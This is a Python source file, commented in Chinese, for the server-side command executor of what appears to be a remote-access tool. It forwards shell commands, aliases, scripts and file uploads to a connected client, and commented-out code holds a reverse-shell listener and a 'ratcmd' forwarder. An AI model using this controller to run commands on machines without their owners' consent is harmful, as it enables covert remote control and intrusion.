import glob
import os
import shlex
from functools import partial

from core.utils.common_util import scan_args, format_dict, parse
from core.utils.server_util import read_first_line
from server.config.config import SCRIPT_PATH


class CommandExecutor:
    def __init__(self, conn, server):
        self.conn = conn
        self.server = server

    # ------------------ 主命令入口 ------------------ #
    def process_command(self, cmd):
        """
        处理命令，返回可执行的生成器函数
        """

        # # 检查是否是ratcmd命令
        # if cmd.startswith('ratcmd '):
        #     return partial(self._handle_ratcmd, cmd)

        name, arg = parse(cmd)

        # 检查是否是方法
        if hasattr(self, name) and callable(getattr(self, name)):
            return partial(getattr(self, name), arg)

        # 检查是否是别名
        alias_cmd = self.server.alias_manager.aliases.get(name)
        if alias_cmd:
            try:
                expanded_cmd = self.server.alias_manager.get_alias_command(name, arg)
                return partial(self.conn.send_command, expanded_cmd)
            except Exception as e:
                return partial(lambda e: [(0, str(e))], e)

        # 默认发送原始命令
        return partial(self.conn.send_command, cmd)

    def upload(self, filename):
        """
        上传文件到客户端
        """
        if not os.path.isfile(filename):
            raise FileNotFoundError(f"File does not exist: {filename}")

        try:
            for status, result in self.conn.send_file(filename):
                yield status, result
        except Exception:
            self.conn.pending_command_ids.clear()
            raise

    def exec(self, filename):
        """
        执行 Python 脚本
        """
        # 不传 filename → 列出脚本
        if not filename:
            scripts = [os.path.relpath(f, SCRIPT_PATH).replace('\\', '/')
                       for f in glob.iglob(os.path.join(SCRIPT_PATH, '**/*.py'), recursive=True)]
            yield 1, '\n'.join(scripts)
            return

        # --help 显示脚本注释
        if filename == '--help':
            scripts = {}
            for f in glob.iglob(os.path.join(SCRIPT_PATH, '**/*.py'), recursive=True):
                key = os.path.relpath(f, SCRIPT_PATH).replace('\\', '/')
                scripts[key] = read_first_line(f)
            yield 1, format_dict(scripts, 25)
            return

        # 发送脚本
        parts = shlex.split(filename)
        script_path = os.path.abspath(os.path.join(SCRIPT_PATH, parts[0]))
        if not os.path.isfile(script_path):
            # 尝试加 .py 后缀
            if os.path.isfile(script_path + '.py'):
                script_path += '.py'
            else:
                raise FileNotFoundError(f"Script not found: {script_path}")

        with open(script_path, 'rt', encoding='utf-8') as f:
            try:
                func = partial(self.conn.send_command, f.read(), type='script', extra=scan_args(parts[1:]))
                for i in func():
                    yield i
            except UnicodeDecodeError:
                raise RuntimeError(f"Unable to read file: {script_path}")

    #
    # def history(self, arg):
    #     """
    #     显示历史记录
    #     :param arg: -f 显示详细信息 -c 清除记录
    #     """
    #     if arg in ['-f', '--full']:
    #         yield 1, json.dumps(self.conn.command_history, ensure_ascii=False, indent=2)
    #     elif arg in ['-c', '--clear']:
    #         self.conn.command_history.clear()
    #         yield 1, 'History cleared'
    #     else:
    #         yield 1, '\n'.join([cmd['command'] for cmd in self.conn.command_history])

    # def save_result(self, command):
    #     """
    #     将命令结果写入本地文件
    #     """
    #     if not command:
    #         return 0, ''
    #
    #     func = self.process_command(command)
    #     filename = f'{replace_spaces(secure_filename(command))}_{self.conn.address[0]}_{get_time()}.txt'
    #     with open(filename, 'wt') as f:
    #         for i in func():
    #             f.write(i[1] + '\n')
    #     yield 1, 'Result saved to {}'.format(filename)

    # ------------------ 别名管理 ------------------ #
    def alias(self, arg):
        """
        添加或显示命令别名
        """
        if not arg:
            yield 1, format_dict(self.server.alias_manager.list_aliases())
            return

        try:
            if '=' in arg:
                # 添加或更新别名
                alias, cmd = [part.strip() for part in arg.split('=', 1)]
                self.server.alias_manager.add_alias(alias, cmd)
                yield 1, f'Alias added: {alias} -> {cmd}'
            else:
                raise ValueError("Missing '=' in alias definition")
        except Exception as e:
            raise ValueError(f"Invalid alias: {e}")

    def unalias(self, arg):
        """移除命令别名"""
        if not arg:
            raise ValueError("Missing alias name")

        try:
            self.server.alias_manager.remove_alias(arg)
            yield 1, f'Alias removed: {arg}'
        except KeyError as e:
            raise ValueError(f"Alias not found: {arg}")

    # def revshell(self, cmd):
    #     """
    #     打开一个可完全交互的shell，支持stdin
    #     """
    #
    #     # 后台接收线程，接收数据并在前台显示，如果出现异常终止线程
    #     def recv():
    #         try:
    #             while 1:
    #                 data = rev_con.recv(1024)
    #                 if not data:
    #                     break
    #                 sys.stdout.write(data.decode('gbk'))
    #                 sys.stdout.flush()
    #         except socket.error as e:
    #             logger.error(f'Connection aborted: {e}')
    #             raise
    #
    #     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #     addr = ('0.0.0.0', 0)
    #     s.bind(addr)
    #
    #     # 服务端获取一个随机可用端口，并将其作为参数发送给客户端
    #     cmd += f'revshell {s.getsockname()[1]}'
    #
    #     func = partial(self.conn.send_command, cmd)
    #
    #
    #     if func:
    #         for i in func():
    #             write(*i)
    #
    #     s.listen(5)
    #     print('Listening on {}'.format(s.getsockname()))
    #     rev_con, addr = s.accept()
    #     print('Connection from {}'.format(addr))
    #     threading.Thread(target=recv).start()
    #     # line_sep = None
    #     if os.name == 'nt':
    #         line_sep = '\r\n'
    #     else:
    #         line_sep = '\n'
    #
    #     while 1:
    #         try:
    #             cmd = input('>')  # 使用自定义提示符
    #             if cmd.lower() in ['exit', 'quit']:
    #                 rev_con.send(bytes('exit' + line_sep, encoding='gbk'))
    #                 break
    #             rev_con.send(bytes(cmd + line_sep, encoding='gbk'))
    #         except (EOFError, KeyboardInterrupt):  # 处理 Ctrl+C / Ctrl+D
    #             rev_con.send(bytes('exit' + line_sep, encoding='gbk'))
    #             break
    #
    #     yield 1, 'Done'
    #
    # def _handle_ratcmd(self, cmd_text):
    #     """
    #     处理ratcmd命令 - 仅转发，不解析具体内容
    #     """
    #     try:
    #         # 简单验证是否是ratcmd格式
    #         if not cmd_text.strip().startswith('ratcmd '):
    #             yield 0, "Invalid ratcmd format"
    #             return
    #
    #         # 直接转发给客户端，类型标记为'ratcmd'
    #         for result in self.conn.send_command(cmd_text, type='ratcmd'):
    #             yield result
    #
    #     except Exception as e:
    #         yield 0, f"RATCMD Error: {str(e)}"
    #
